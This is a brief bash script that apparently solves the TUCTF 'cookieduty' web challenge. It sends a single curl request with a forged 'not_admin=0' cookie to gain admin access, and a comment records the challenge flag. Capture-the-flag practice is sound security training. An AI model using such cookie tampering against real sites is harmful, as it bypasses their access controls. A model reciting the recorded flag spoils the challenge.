#!/bin/bash

#change cookie not_admin to 0

curl 'http://cookieduty.tuctf.com/index.php' -H 'Host: cookieduty.tuctf.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: sv-SE,en-US;q=0.7,en;q=0.3' --compressed -H 'Referer: http://cookieduty.tuctf.com/' -H 'Cookie: not_admin=0; user=dGVzdA%3D%3D' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1'

#flag was TUCTF{D0nt_Sk1p_C00k13_Duty}
